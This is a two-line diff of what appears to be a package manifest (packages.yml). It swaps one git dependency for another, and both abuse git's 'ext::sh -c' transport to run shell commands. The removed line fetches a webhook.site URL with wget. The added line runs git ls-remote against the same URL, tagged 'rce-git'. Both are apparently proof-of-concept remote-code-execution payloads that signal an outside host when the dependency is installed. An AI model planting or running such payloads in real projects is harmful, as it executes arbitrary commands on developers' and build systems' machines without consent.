@@ -1,2 +1,2 @@
 packages:
-  - git: "ext::sh -c 'wget -q -O- http://webhook.site/9bd9d6f9-ce84-434a-bc5e-61ac8d98044e/rce-wget'"
+  - git: "ext::sh -c 'git ls-remote https://webhook.site/9bd9d6f9-ce84-434a-bc5e-61ac8d98044e/rce-git'"
